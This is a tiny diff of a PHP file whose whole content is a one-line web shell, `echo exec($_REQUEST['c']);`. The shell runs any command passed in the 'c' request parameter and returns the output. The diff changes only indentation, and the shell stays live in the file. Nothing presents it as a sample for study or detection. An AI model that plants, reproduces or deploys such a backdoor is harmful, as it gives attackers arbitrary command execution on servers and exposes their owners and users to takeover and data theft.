@@ -1,3 +1,3 @@
 <?php
-	echo exec($_REQUEST['c']);
+echo exec($_REQUEST['c']);
 ?>
